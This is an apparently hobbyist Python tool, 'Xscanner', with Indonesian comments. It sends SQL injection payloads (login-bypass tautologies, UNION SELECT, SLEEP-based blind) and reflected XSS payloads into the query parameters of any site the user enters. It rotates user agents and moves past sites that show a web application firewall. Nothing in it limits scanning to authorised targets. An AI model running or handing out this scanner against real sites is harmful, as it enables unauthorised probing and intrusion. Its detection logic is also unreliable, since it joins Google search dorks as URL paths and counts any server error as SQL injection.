import requests
import random
from urllib.parse import urljoin, urlparse, parse_qs, urlencode, urlunparse
from colorama import Fore, Style, init

# Inisialisasi Colorama untuk warna di terminal
init(autoreset=True)

# --- Konfigurasi Global ---
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/112.0",
]

# --- Deteksi WAF ---
def is_waf_present(response):
    waf_indicators = [
        "waf", "firewall", "access denied", "forbidden", "not allowed",
        "blocked by", "mod_security", "incapsula", "cloudflare", "sucuri",
        "request blocked", "proxy error", "cloudfront", # Tambahan indikator umum
        "azureus", # Contoh WAF/proxy
    ]
    
    # Cek status code yang umum tanda WAF
    if response.status_code in [403, 406, 501, 503, 429]: # 429 Too Many Requests bisa jadi indikasi WAF/rate limiting
        return True

    # Cek isi body response (dalam huruf kecil)
    body = response.text.lower()
    for indicator in waf_indicators:
        if indicator in body:
            return True

    # Cek header yang umum di WAF
    server_header = response.headers.get("Server", "").lower()
    powered_by_header = response.headers.get("X-Powered-By", "").lower()
    via_header = response.headers.get("Via", "").lower()

    if any(waf_name in server_header for waf_name in ["cloudflare", "incapsula", "sucuri", "mod_security", "akamai", "nginx-waf"]):
        return True
    if any(waf_name in powered_by_header for waf_name in ["waf", "cloud"]):
        return True
    if "proxy" in via_header or "waf" in via_header:
        return True

    # Cek header spesifik WAF
    if "X-WAF-Info" in response.headers or "X-Firewall-Rule" in response.headers:
        return True

    return False

# --- Fungsi Umum URL & Payload ---
def inject_payload_to_url(url, payload):
    """Menyisipkan payload ke semua parameter query di URL."""
    parsed = urlparse(url)
    qs = parse_qs(parsed.query)
    
    if not qs: # Jika tidak ada parameter query, coba tambahkan saja di akhir URL
        new_url = f"{url}?param={payload}"
        return new_url

    # Sisipkan payload ke semua nilai parameter yang ada
    for key in qs:
        # Menambahkan payload ke nilai parameter yang sudah ada
        qs[key] = [qs[key][0] + payload]
    
    new_qs = urlencode(qs, doseq=True) # doseq=True untuk parameter dengan banyak nilai
    new_url = urlunparse(parsed._replace(query=new_qs))
    return new_url

# --- SQLi Module ---
sql_payloads = [
    "'", "';", "--", "/**/", "/*", # Payload dasar
    "' OR '1'='1", "\" OR \"1\"=\"1", "') OR ('1'='1", # Bypass login
    "';--", "')--", # Komentar
    " UNION SELECT NULL,NULL,NULL--", # Union-based
    " ORDER BY 1--", # Order by
    "benchmark(5000000,MD5(1))", # Time-based blind
    "SLEEP(5)", # Time-based blind
]

sql_errors = [
    "you have an error in your sql syntax",
    "warning: mysql",
    "unclosed quotation mark",
    "quoted string not properly terminated",
    "mysql_fetch_array()",
    "supplied argument is not a valid MySQL",
    "sqlstate",
    "odbc",
    "error in your query",
    "pg_connect()", # PostgreSQL
    "syntax error near", # Generic for various DBs
    "ORA-00900", "ORA-01017", # Oracle
    "microsoft jet database engine", # MS Access
    "unclosed parenthesis", # General syntax
]

def check_sqli_vulnerability(url):
    headers = {'User-Agent': random.choice(user_agents)}
    for payload in sql_payloads:
        test_url = inject_payload_to_url(url, payload)
        try:
            response = requests.get(test_url, headers=headers, timeout=10) # Timeout ditingkatkan
            
            if is_waf_present(response):
                return False # Jika WAF terdeteksi, anggap tidak vuln atau skip

            # Cek error SQL di body response
            body_lower = response.text.lower()
            for error in sql_errors:
                if error.lower() in body_lower:
                    return True # SQL Error ditemukan, kemungkinan rentan

            # Cek status code 500 (Internal Server Error)
            if response.status_code == 500:
                # Perlu hati-hati dengan 500, bisa jadi bukan SQLi
                # Tapi ini indikasi kuat jika dipicu oleh payload
                return True
                
        except requests.exceptions.Timeout:
            # print(f"    [!] Timeout saat tes SQLi pada {test_url}") # Debugging
            continue # Lanjutkan ke payload berikutnya
        except requests.RequestException as e:
            # print(f"    [!] Request Error SQLi pada {test_url}: {e}") # Debugging
            pass # Lewati error dan coba payload lain
    return False

# --- XSS Module ---
xss_payloads = [
    "<script>alert(1)</script>",
    "';alert(1)//",
    "\"><script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg/onload=alert(1)>",
    "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==", # Data URI XSS
    "javascript:alert(1)", # XSS di atribut href
    "\" autofocus onfocus=alert(1) id=", # HTML injection with event handler
    "</textarea><script>alert(1)</script>", # Textarea break
    "<body onload=alert(1)>", # Body event
    "<iframe srcdoc='<script>alert(1)</script>'>", # Iframe srcdoc
]

xss_indicators = [
    "alert(1)",
    "document.domain",
    "<script>",
    "<img src=x onerror=",
    "<svg/onload=",
    "confirm(1)", # Tambahan indikator
    "prompt(1)", # Tambahan indikator
]

def check_xss_vulnerability(url):
    headers = {'User-Agent': random.choice(user_agents)}
    for payload in xss_payloads:
        # Untuk XSS, kita juga bisa mencoba injeksi di path jika tidak ada query param
        # Namun untuk simplicity dan dorking, kita fokus pada query params dulu.
        test_url = inject_payload_to_url(url, payload)
        
        try:
            response = requests.get(test_url, headers=headers, timeout=10)
            
            if is_waf_present(response):
                return False # Jika WAF terdeteksi, anggap tidak vuln atau skip

            # Cek apakah payload XSS atau indikatornya terefleksi di body response
            # Ini adalah indikator paling dasar untuk XSS reflected
            body_lower = response.text.lower()
            if payload.lower() in body_lower:
                for indicator in xss_indicators:
                    if indicator.lower() in body_lower:
                        return True # Payload dan indikator ditemukan, kemungkinan rentan
        
        except requests.exceptions.Timeout:
            # print(f"    [!] Timeout saat tes XSS pada {test_url}") # Debugging
            continue
        except requests.RequestException as e:
            # print(f"    [!] Request Error XSS pada {test_url}: {e}") # Debugging
            pass
    return False

# --- Banner ---
def print_banner():
    banner = f"""
{Fore.RED}██╗  ██╗██╗  ██╗███████╗ ██████╗ ██████╗
{Fore.RED}██║  ██║██║ ██╔╝██╔════╝██╔═══██╗██╔══██╗
{Fore.RED}███████║█████╔╝ █████╗  ██║   ██║██████╔╝
{Fore.RED}██╔══██║██╔═██╗ ██╔══╝  ██║   ██║██╔═══╝
{Fore.RED}██║  ██║██║  ██╗███████╗╚██████╔╝██║
{Fore.RED}╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚═╝

{Fore.MAGENTA}          Xscanner BY HeruGanz1337
{Style.RESET_ALL}
"""
    print(banner)

# --- Dork Loader ---
def load_dorks(file_path):
    """Membaca dork dari file."""
    try:
        with open(file_path, "r") as f:
            return [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(Fore.RED + f"[!] File {file_path} tidak ditemukan.")
        print(Fore.YELLOW + "    Pastikan ada file bernama 'google dorks for sql injection.txt' di direktori yang sama.")
        return []

# --- Fungsi Utama ---
def main():
    print_banner()
    base_url = input("Masukan Target (contoh: http://example.com/): ").strip()
    
    if not (base_url.startswith("http://") or base_url.startswith("https://")):
        print(Fore.RED + "[-] URL harus diawali dengan http:// atau https://.")
        return

    # Pastikan base_url diakhiri dengan '/' agar urljoin bekerja dengan benar untuk dorking
    if not base_url.endswith('/'):
        base_url += '/'

    dorks = load_dorks("google dorks for sql injection.txt")
    if not dorks:
        return

    print(f"\n[~] Memulai scan pada {len(dorks)} dork...\n")

    for dork in dorks:
        # Bentuk URL lengkap dengan dork
        # urljoin akan menggabungkan base_url dan dork dengan benar
        full_url = urljoin(base_url, dork)
        
        # Inisialisasi status kerentanan
        sqli_vulnerable = False
        xss_vulnerable = False

        # Cek SQLi
        print(f"{Fore.CYAN}[*] Menganalisa SQLi untuk: {full_url}{Style.RESET_ALL}")
        sqli_vulnerable = check_sqli_vulnerability(full_url)
        
        # Cek XSS
        print(f"{Fore.CYAN}[*] Menganalisa XSS untuk: {full_url}{Style.RESET_ALL}")
        xss_vulnerable = check_xss_vulnerability(full_url)
        
        # Tentukan dan cetak status akhir
        final_status = ""
        if sqli_vulnerable:
            final_status += f"{Fore.RED}[SQLi]{Style.RESET_ALL} "
        if xss_vulnerable:
            final_status += f"{Fore.RED}[XSS]{Style.RESET_ALL} "
        
        if not sqli_vulnerable and not xss_vulnerable:
            final_status = f"{Fore.GREEN}[tidak vuln]{Style.RESET_ALL}"
        
        print(f"[{Fore.BLUE}RESULT{Style.RESET_ALL}] {full_url} {final_status.strip()}")
        print("-" * 70) # Garis pemisah untuk keterbacaan

if __name__ == "__main__":
    main()